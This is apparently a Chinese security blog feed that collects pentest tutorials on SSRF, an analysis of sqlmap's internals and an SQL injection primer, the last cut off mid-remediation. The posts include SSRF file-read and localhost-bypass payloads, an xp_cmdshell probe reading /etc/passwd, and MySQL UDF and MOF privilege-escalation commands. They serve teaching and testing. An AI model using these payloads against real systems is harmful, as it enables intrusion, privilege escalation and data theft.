class="line-numbers language-python" data-language="python"><code class="language-python">python <span class="token operator">-</span>m http<span class="token punctuation">.</span>server <span class="token number">2333</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221017235002661.png"></p><p>使用游览器访问<code>http://192.168.1.4:2333/</code> ，可以看到已经获跨域成功并获取到了信息</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221017235109628.png"></p><p>此时观察 burp，有两条流量，一条获取 html 源码，一条向 B 站点发起跨域请求。</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221017235210844.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> CORS </tag>
            
            <tag> JSONP </tag>
            
            <tag> 前端安全 </tag>
            
            <tag> 钓鱼 </tag>
            
            <tag> 同源策略 </tag>
            
            <tag> 跨域 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF</title>
      <link href="/2022/10/12/ssrf/"/>
      <url>/2022/10/12/ssrf/</url>
      
        <content type="html"><![CDATA[<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>SSRF（Server Side Request Forgery, 服务端请求伪造）服务端漏洞。通常被用来攻击服务端的内部系统。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>简单讲就是服务端实现了一个功能，代为访问用户提交的目标。</p><h2 id="业务场景"><a href="#业务场景" class="headerlink" title="业务场景"></a>业务场景</h2><p>需要服务端做为中转的场景，如因为跨域问题服务端代为下载存放在其他站点的文件。</p><h2 id="测试思路"><a href="#测试思路" class="headerlink" title="测试思路"></a>测试思路</h2><p>注意 HTTP 请求中值为 URL 格式的字段。</p><p>但有一个点容易忽略，如果是服务端代为下载文件，burp suite 的 proxy-http history 中并不会出现该条请求。</p><h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><ul><li>以漏洞服务端作为中转攻击内网</li><li>本地文件泄露，进而造成信息泄露</li><li>读取或更新内部资源</li><li>内网信息收集</li><li>绕过安全限制</li></ul><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>SSRF 共有三种类型 echo、bool、none，分别为有回显、bool 回显、无回显。</p><h3 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h3><p>中转请求发送完成后将响应返回给客户端</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221012202950650.png"></p><h3 id="bool"><a href="#bool" class="headerlink" title="bool"></a>bool</h3><p>中转请求发送后将响应不返回给客户端详细的响应，只是告诉客户端是否请求成功</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221012203151731.png"></p><h3 id="none"><a href="#none" class="headerlink" title="none"></a>none</h3><p>中转请求发送后只是告诉客户端已请求</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221012203300634.png"></p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221012203306849.png"></p><h2 id="支持的协议"><a href="#支持的协议" class="headerlink" title="支持的协议"></a>支持的协议</h2><p>有<code>http</code> <code>https</code> <code>file</code> <code>dict</code> <code>gopher</code> <code>ftp</code> <code>telnet</code> <code>ldap</code>等，主要还是看服务端再次发起请求的方式支持哪些协议。</p><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><h3 id="读取本地文件"><a href="#读取本地文件" class="headerlink" title="读取本地文件"></a>读取本地文件</h3><p>只能在 echo 类型下使用，利用 file 协议</p><pre class="line-numbers language-none"><code class="language-none">/api/vuls/ssrf/echo?url=file:///c:/flag.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221012204135549.png"></p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>三种类型均可，只是判断的方式不同</p><p>在 echo、bool 类型下直接 http 协议通过响应结果即可判断</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221012211237404.png"></p><p>在 none 类型下，只能通过响应时间判断，前提请求不是异步的</p><p>例如端口开放：4ms</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221012210907172.png"></p><p>例如端口不开放：2000ms</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221012210846342.png"></p><h3 id="内网主机发现"><a href="#内网主机发现" class="headerlink" title="内网主机发现"></a>内网主机发现</h3><p>与端口扫描测试方式类似，但首先得知道内网肯定会开放的端口，例如在 java 微服务内网中，web 服务采用默认端口 8080 的话，可以使用 http://{host}:8080 扫描，再通过响应内容/响应时间判断。</p><h3 id="绕过安全限制"><a href="#绕过安全限制" class="headerlink" title="绕过安全限制"></a>绕过安全限制</h3><p>假设在外网出口做了一些安全限制，比如 path 名单，这个时候就可以通过 ssrf 绕过</p><h3 id="攻击内网脆弱组件"><a href="#攻击内网脆弱组件" class="headerlink" title="攻击内网脆弱组件"></a>攻击内网脆弱组件</h3><p>主要利用 Gopher 协议，可以看下方关于 Gopher 的介绍。</p><p>简单讲就是 Gopher 协议允许 data 段携带类似 socket 的请求报文来发送请求</p><h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><p>先来看一下 URL 的结构</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221012231003524.png"></p><table><thead><tr><th>限制</th><th>绕过方式</th><th>说明</th></tr></thead><tbody><tr><td>host 不等于 localhost/127.0.0.1</td><td>域名解析到内网</td><td>sudo.cc A 记录解析到 127.0.0.1</td></tr><tr><td>host 不等于 localhost/127.0.0.1</td><td><code>0</code> <code>0.0.0.0</code>，仅 linux</td><td><a href="http://0.0.0.0/">http://0</a><br><a href="http://0.0.0.0/">http://0.0.0.0</a></td></tr><tr><td>host 不等于 localhost/127.0.0.1</td><td>特殊数字</td><td><a href="http://127.0.0.1/">http://1②7.0.0.1</a></td></tr><tr><td>host 不等于 localhost/127.0.0.1</td><td>句号替换.</td><td><a href="http://127.0.0.1/">http://127。0。0。1</a></td></tr><tr><td>host 不等于 localhost/127.0.0.1</td><td>省略</td><td><a href="http://127.0.0.1/">http://127.1</a></td></tr><tr><td>host 不等于 localhost/127.0.0.1</td><td>进制转换</td><td><a href="http://127.0.0.1/">http://0177.0.0.1</a><br><a href="http://127.0.0.1/">http://0x7f.0.0.1</a><br><a href="http://127.0.0.1/">http://2130706433</a></td></tr><tr><td>服务端先做一次 DNS 解析，再判断解析出的 host 值</td><td>DNS 重绑定</td><td>简单讲就是设置域名的 TTL 为 0，这时候 DNS 解析和后续发起请求就会存在一个时间差，以此来绕过。</td></tr><tr><td>authority.startswith()！= 数字</td><td>@</td><td><a href="http://c@127.0.0.1/">http://c@127.0.0.1</a></td></tr><tr><td>authority.endsswith!=数字</td><td>#</td><td><a href="http://127.0.0.1%23123">http://127.0.0.1%23123</a></td></tr></tbody></table><h2 id="Gopher-协议"><a href="#Gopher-协议" class="headerlink" title="Gopher 协议"></a>Gopher 协议</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>Gopher 是 Internet 上一个非常有名的信息查找系统，它将 Internet 上的文件组织成某种索引，很方便地将用户从 Internet 的一处带到另一处。在 WWW 出现之前，Gopher 是 Internet 上最主要的信息检索工具，Gopher 站点也是最主要的站点，使用 tcp 70 端口。但在 WWW 出现后，Gopher 失去了昔日的辉煌。现在它基本过时。</p><h3 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h3><p><code>gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_data</code></p><p>默认端口是 70，后边的 data 可以理解为 socket 请求的数据报文。</p><p>需要注意的是换行符需要使用<code>\r\n</code></p><h3 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h3><p>Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 等 HTTP 请求。这极大拓宽了 SSRF 的攻击面。</p><h3 id="轮子"><a href="#轮子" class="headerlink" title="轮子"></a>轮子</h3><p><a href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a> 做了一些协议的封装</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://tttang.com/archive/1648/">https://tttang.com/archive/1648/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 常规Web漏洞 </tag>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap 浅析</title>
      <link href="/2022/10/10/sqlmap-qian-xi/"/>
      <url>/2022/10/10/sqlmap-qian-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="sqlmap-浅析"><a href="#sqlmap-浅析" class="headerlink" title="sqlmap 浅析"></a>sqlmap 浅析</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>sql 注入测试&amp;利用神器。</p><p>分析版本为<code>1.6.10.2#dev</code></p><h2 id="配置项"><a href="#配置项" class="headerlink" title="配置项"></a>配置项</h2><p>先看配置项</p><pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -hh &gt; options.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Options</p><ul><li>Target：指定测试目标。常用<code>-u</code> <code>-r</code> 分别指定 url 和请求报文</li><li>Injection：注入点配置。指定测试参数、排除参数、指定 db/os 类型、是否开启转义、payload 前后缀、temper 等</li><li>Request：请求时的参数配置。如 cookie、header、proxy、csrf、timeout、请求间隔、忽略证书问题等</li><li>General：全局参数配置。web 根目录、扫描流量记录、结果输出、编码处理、WAF 检测、刷新缓存等</li><li>Techniques：指定注入手法/不同注入手法的特有配置。如指定注入手法、延时注入的时间、dnslog 注入的域名、二次注入加载等</li><li>Enumeration：枚举出目标字段/指定当漏洞存在时 sql 语句中的某些字段。如–dbs 列出所有数据库名、-D 指定数据库名、–sql-query 指定 sql 语句等</li><li>Fingerprint：指纹识别。是否使用指纹库对 dbms 及其版本进行识别</li><li>Brute force：暴力破解。如爆破常规表名、列名、文件名</li><li>Detection：测试等级。</li><li>User-defined function injection：udf 注入。指定 udf 生成的函数名、so 文件 dump 的目录</li><li>File system access：文件读写相关。</li><li>Operating system access：操作系统相关。指定执行的命令、生成交互式 shell、提权、msf/tmp 文件目录</li><li>Windows registry access：windows 注册表相关。增删改查注册表</li><li>Optimization：性能优化项。如设置线程数、是否开启长链接等</li><li>Miscellaneous：其他项。依赖检查、日志颜色输出、update、sqlmap shell、关闭日志等。</li></ul><h2 id="pycharm-debug-配置"><a href="#pycharm-debug-配置" class="headerlink" title="pycharm debug 配置"></a>pycharm debug 配置</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># flow.txt为靶场请求报文</span>-r flow.txt --flush-session --dbs --ignore-stdin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221010202002711.png"></p><h2 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h2><h3 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h3><p>主要做了环境检测、配置 path、输出 banner、命令行参数保存等</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221010202626052.png"></p><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>配置命令行参数、加载 payload、更新配置等。这里主要看下 payload 的加载</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221010203234635.png"></p><h4 id="payload-加载"><a href="#payload-加载" class="headerlink" title="payload 加载"></a>payload 加载</h4><h5 id="loadBoundaries"><a href="#loadBoundaries" class="headerlink" title="loadBoundaries()"></a>loadBoundaries()</h5><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221010203753909.png"></p><p>这里加载并解析了<code>data/xml/boundaries.xml</code>这个文件，看下这个文件的内容。</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221010204102747.png"></p><p>看起来这个函数主要加载了一些 payload 的前缀和后缀，主要作用是为了闭合 sql 语句。</p><h5 id="loadPayloads"><a href="#loadPayloads" class="headerlink" title="loadPayloads()"></a>loadPayloads()</h5><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221010204740588.png"></p><p>loadPayloads 函数会遍历并加载<code>data/xml/payloads</code> 下不同注入手法的 payload，主要有 bool 盲注、时间盲注、报错注入、堆叠注入、联合查询注入、内联查询注入。</p><p>我们挑一个 payload 看下结构</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221010204809555.png"></p><p>分别有 title(对测试项的解释)、等级限制、request 中需要插入的 payload 模板、对 response 的 check 方式等。</p><h5 id="loadQueries"><a href="#loadQueries" class="headerlink" title="_loadQueries()"></a>_loadQueries()</h5><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221010205153846.png"></p><p>从<code>data/xml/queries.xml</code>加载 xml，我们看下这个 xml 的内容</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221010205327001.png"></p><p>这里记录了很多查询语句以及不同 sql 的语法。</p><p>看到这里，发现<code>data/xml</code> 目录下还有 errors.xml 和 banner 目录没看到，我们看一下</p><p><code>errors.xml</code> 记录了不同 sql 的多种报错信息</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221010205538887.png"></p><p>banner 底下挑一个看下，看来是通过正则获取一些可能存在 sql 信息泄露位置的信息(用作指纹识别)</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221010205626441.png"></p><h3 id="扫描前处理"><a href="#扫描前处理" class="headerlink" title="扫描前处理"></a>扫描前处理</h3><p>走出 init 后，做了一些判断然后进入 start 函数，该阶段主要做了 URL Normailze、WAF 探测等</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221010210504811.png"></p><h4 id="Request-Normalize"><a href="#Request-Normalize" class="headerlink" title="Request Normalize"></a>Request Normalize</h4><p>进入 start 函数，前边还是做了一些配置类的操作，然后走到了<code>parseTargetUrl()</code> 对请求数据进行处理，这里主要的目的是将不需要测试是否存在注入的数据存储。</p><p>前边一大段对 URL 格式进行了一些判断和处理，存储不需要注入的项，如端口，域名，path 等</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221010231017902.png"></p><p>下面代码是对 referer、host 头进行存储。</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221010233130151.png"></p><h4 id="WAF-探测"><a href="#WAF-探测" class="headerlink" title="WAF 探测"></a>WAF 探测</h4><p>跳出<code>parseTargetUrl()</code> 后对 host 进行判断是否已扫描出注入漏洞，并且对 target 做了一次健康检查， 拿到 response。之后走到<code>checkWAF</code></p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221010233236028.png"></p><p>这里使用 SQL、XSS、命令执行等一些必被 WAF 拦截的 payload 测试</p><pre class="line-numbers language-none"><code class="language-none">AND 1=1 UNION ALL SELECT 1,NULL,'&lt;script&gt;alert(\"XSS\")&lt;/script&gt;',table_name FROM information_schema.tables WHERE 2&gt;1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接着进入发送请求的位置，<code>Request.queryPage()</code>方法，死长的一个函数(600 多行)，先不详细分析它的代码，这里先看代码是怎样判断是否存在 WAF 的，直接找到处理响应的位置<code>processResponse()</code></p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221010234953239.png"></p><p>核心检查代码<code>identYwaf.non_blind_check()</code> ，继续跟进</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221010235049638.png"></p><p>这里直接正则匹配响应报文，看一下这些正则从哪来的，直接搜</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221010235208003.png"></p><p>可以看到，是从<code>thirdparty/identywaf/data.json</code> 中的<code>wafs</code>加载的，看下这个文件</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221010235359922.png"></p><p>看来是收集了一些常见 waf 的签名，关键响应的正则。用这些正则来匹配探测 WAF，如果匹配成功，就向<code>kb.identifiedWafs</code> 中添加数据。</p><p>同时我们发现<code>Request.queryPage()</code> 还会计算页面相似比率，并将其返回，如果小于 0.5，也认为存在 WAF</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221011001230808.png"></p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221011001557272.png"></p><p>这里还有个有意思的操作<code>hashDBWrite() </code> ，这个函数向对<code>conf.hashDB</code> 做了一些操作，看一下</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221010235853481.png"></p><p>看起来这是本地起了一个 sqlite 用来存储一些用于避免重复操作的 hash，有 DBMS 判断、WAF Check、OS 判断等。</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221011000027603.png"></p><h3 id="注入测试"><a href="#注入测试" class="headerlink" title="注入测试"></a>注入测试</h3><p>WAF 探测完成之后，就进入了核心阶段 payload 测试了，这里看到有两步，启发式 SQL 注入检测和正式的注入检测。</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221011001829937.png"></p><h4 id="启发式检测"><a href="#启发式检测" class="headerlink" title="启发式检测"></a>启发式检测</h4><p>这里拿到了一个元组，都是一些会引起 SQL 语句闭合的字符，然后拼接我们的参数组成 payload</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># HEURISTIC_CHECK_ALPHABET</span><span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">')'</span><span class="token punctuation">,</span> <span class="token string">'('</span><span class="token punctuation">,</span> <span class="token string">','</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token comment"># payload</span><span class="token punctuation">{</span><span class="token string">"id"</span><span class="token punctuation">:</span><span class="token string">"__PAYLOAD_DELIMITER__1)('(..(("</span><span class="token punctuation">(</span>__PAYLOAD_DELIMITER__"<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>接着发送请求，通过正则匹配判断本次请求是否有报错信息。</p><p>如果存在报错信息，那么就说明启发式检测成功，此时会输出 log 并且存储报错的 dbms 类型。</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221011003648472.png"></p><h4 id="正式注入测试"><a href="#正式注入测试" class="headerlink" title="正式注入测试"></a>正式注入测试</h4><p>跟进<code>checkSqlInjection()</code> ，这里会拿到在<code>loadBoundaries()</code> 阶段加载的用于组成 payload 的前缀、后缀、等级等</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221011230932716.png"></p><p>接着通过<code>getSortedInjectionTests()</code> 拿到<code>loadPayloads()</code> 阶段从 xml 中加载的不同注入手法的 payload。</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221011231137900.png"></p><p>然后就循环尝试每个 payload，这里挑一条看，进入循环后先判断是否已经识别到 dbms 的类型，如果未识别，会再次进行一次启发式检测。</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221011232302200.png"></p><p>之后进行了一些参数的判断，走到<code>agent.cleanupPayload()</code> 对 payload 进行处理</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221011232353620.png"></p><p>跟进下看是怎么处理的，看起来就是对 xml 中定义的”变量”进行替换</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221011232551789.png"></p><p>再然后遍历 boundaries，将前缀、后缀、测试参数 key，请求格式等组合进 payload 生成最终的 reqPayload</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221011232849576.png"></p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221011232909608.png"></p><p>然后加载了在 xml 定义好的每种 payload 的检查是否攻击成功的方式，有<code>comparison</code> <code>grep</code> <code>time</code> <code>union</code> 分别对应的操作是比较页面、检索关键字、时间判断、联合判断，对应的 SQL 注入手法是 bool、error、time、union 类型</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221011233226275.png"></p><p>这里分别来看下每种检测方式</p><h5 id="bool-注入"><a href="#bool-注入" class="headerlink" title="bool 注入"></a>bool 注入</h5><p>先执行一次 false 请求，可以理解为 and 1=2，接着再执行一次 ture 请求(and 1=1)，然后会比较原始响应页面、启发式检测响应页面、false 请求请求页面，ture 请求页面的页面相似比，当大于或小于最大或最小的相似比，则认为存在漏洞</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221012012535353.png"></p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221011235604187.png"></p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221011235756483.png"></p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221012012600716.png"></p><h5 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h5><p>这应该属于最简单的了，就是拿到 payload 中的 grep 项正则匹配，如果可以匹配到就存在漏洞</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221012000153932.png"></p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221012000230569.png"></p><h5 id="时间注入"><a href="#时间注入" class="headerlink" title="时间注入"></a>时间注入</h5><p>这个也比较简单，判断是否延时，如果存在延时的情况下，会替换 sleep time 为 0 再 double check 一次，如果没有延时则确认漏洞</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221012000435795.png"></p><h5 id="union-注入"><a href="#union-注入" class="headerlink" title="union 注入"></a>union 注入</h5><p>这玩意代码有点复杂，主要进行 union 注入在<code>lib/techniques/test.py</code> 下，直接搜发送请求的方法<code>Request.queryPage()</code> ，全下断点。</p><p>稍微理清楚一些逻辑，首先会通过<code>_fuzzUnionCols</code>() 方法暴力破解获得 SQL 语句中的查询列数</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221012003442973.png"></p><p>在获取到列数之后，随机生成字符串<code>phrase</code>，对其分段并将字符串处理为 16 进制，然后发送请求</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221012003023722.png"></p><p>之后拿到请求的响应，并将响应中的信息处理成<code>content</code></p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221012003615191.png"></p><p>处理方式是这句代码，看起来是对 resp body 和 resp header 移除掉一些不会用于 phrase 判断的字符</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">content <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"%s%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>removeReflectiveValues<span class="token punctuation">(</span>page<span class="token punctuation">,</span> payload<span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token string">""</span><span class="token punctuation">,</span> removeReflectiveValues<span class="token punctuation">(</span>listToStrValue<span class="token punctuation">(</span>headers<span class="token punctuation">.</span>headers <span class="token keyword">if</span> headers <span class="token keyword">else</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">,</span> payload<span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后再判断之前生成的随机字符<code>phrase</code>是否在<code>content</code> 中，如果在，则认为存在联合查询注入</p><h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p>这里其实很明显会想到一个问题，之前在加载 payload 时，明明类型有 bool、error、time、union、stacked、inline，而上面的正式测试阶段只看到了 bool、error、time、union 的 check，那么 stacked、inline 去哪了</p><p>带着这个问题，我们回头看下存放 payload 的 xml</p><p><code>stacked_queries.xml</code> ，瞬间明白，原来堆叠注入这里下一条语句都是 sleep，那就说明堆叠注入的 check 其实是在时间注入的阶段做的。</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221012004412023.png"></p><p><code>inline_query.xml</code> ，原来这里不是 payload，是对于不同数据库，将多条查询结果进行拼接的 SQL 语句，看来是用在后续利用的。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>分析 sqlmap 的原因一方面是学习 sqlmap 对 sql 注入的测试流程，另一方面是学习如何通过代码判断每种注入手法的 payload 是否攻击成功的思路。这两方面都收获不少。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://wjlshare.com/archives/1733">http://wjlshare.com/archives/1733</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
            <tag> 安全工具分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL 注入</title>
      <link href="/2022/10/08/sql-zhu-ru/"/>
      <url>/2022/10/08/sql-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>SQL 注入(SQL injection)，发生于应用程序与数据库间的安全漏洞，注入漏洞的一种。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>简而言之，是攻击者在应用程序与数据库交互的 SQL 语句中注入恶意的 SQL 指定，如果应用程序存在缺陷，那么这些注入进去的恶意指令就会被数据库服务器误认为是正常的 SQL 命令执行。</p><h2 id="业务场景"><a href="#业务场景" class="headerlink" title="业务场景"></a>业务场景</h2><p>一切与数据库交互的地方</p><h2 id="测试思路"><a href="#测试思路" class="headerlink" title="测试思路"></a>测试思路</h2><p>  一切与数据库交互的地方都有可能存在 SQL 注入漏洞。</p><p>  1.在测试时尽量多以开发角度去思考，如当前交互的 SQL 语句是怎样的、当前测试的字段是在 SQL 语句中的位置。</p><p>  2.开发过程中常常会将重复的代码块抽象出来，如果一处接口的某个字段有漏洞，其他相似功能/接口也有很大可能有问题，甚至同一个公司跨微产品，跨微服务。</p><p>  3.在 java mybatis 场景下尝试测试排序字段及排序方式的字段，因为这两个字段使用预编译(#)会报错。</p><p>  4.在测试前先探测是否存在 waf、waf 的厂商、fuzz waf 规则。</p><p>  推荐的扫描工具: xray、burp suite</p><h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><ul><li><p>数据泄露</p></li><li><p>操控数据库、篡改网页</p></li><li><p>获取服务器权限</p></li><li><p>提权</p></li></ul><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><ul><li><p>操作数据库</p><ul><li>信息泄露、拖库</li><li>恶意破坏、删库</li><li>修改数据库，操控web端的某些流程(如登录后台继续深入测试)</li><li>各种注入手法的利用</li></ul></li><li><p>篡改网页</p></li><li><p>getshell</p><ul><li>php环境下且有文件写权限时，直接写入一句话或操控日志文件再利用文件包含等。</li><li>数据库为mssql，利用<code>xp_dirtree</code>、<code>xp_cmdshell</code>等</li><li>利用mysql udf、mof等提权方式getshell</li></ul></li><li><p>提权</p><ul><li><p>mysql udf提权</p><ul><li><p>写入文件到plugin <code>select unhex(...) into dumpfile "/usr/lib/mysql/plugin/lib_mysqludf_sys.so"</code>，或者直接上传(满足条件)</p></li><li><p>加载恶意链接库创建函数 <code>create function sys_eval returns string soname "lib_mysqludf_sys.so";</code></p></li><li><p>执行命令<code>select sys_eval("whoami");</code></p></li><li><p>清除<code>drop function sys_eval;</code></p></li></ul><p>工具: sqlmap(–os-shell)、msf(exploit/multi/mysql/mysql_udf_payload)、php大马</p></li><li><p>mof提权</p><p>简介：mof是windows系统的一个文件（在c:/windows/system32/wbem/mof/nullevt.mof）叫做”托管对象格式”其作用是每隔五秒就会去监控进程创建和死亡。其就是用了mysql的root权限了以后，然后使用root权限去执行我们上传的mof。隔了一定时间以后这个mof就会被执行，可以再启动写入vbs脚本执行系统命令</p><p>条件：windows、C:\Windows\System32\wbem\MOF目录写权限</p><p>上传之后加载：<code>select load_file("nullevt.mof") into dumpfile "c:/windows/system32/wbem/mof/nullevt.mof"</code></p><p>清理痕迹：想要清理痕迹得先暂时关闭 winmgmt 服务再删除相关 mof 文件，否则mof文件会被一直执行</p><p>msf也支持mof提权并且会自动清理痕迹</p></li><li><p>启动项提权</p><p>条件：windows、C:\Users\用户名\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup目录写权限</p></li><li><p>CVE-2016-6663</p></li><li><p>CVE-2016-6664</p></li></ul></li></ul><h2 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a>修复方式</h2><h3 id="输入控制"><a href="#输入控制" class="headerlink" title="输入控制"></a>输入控制</h3><ul><li>严格控制输入数据的类型</li><li>严格控制输入数据的长度</li><li>所有与数据库交互的位置做合法性判断。禁止出现一些特殊字符或关键词，如<code>'</code> <code>"</code> <code>\</code> <code>&lt;</code> <code>&gt;</code> <code>&amp;</code> <code>*</code> <code>;</code> <code>#</code> <code>select</code> 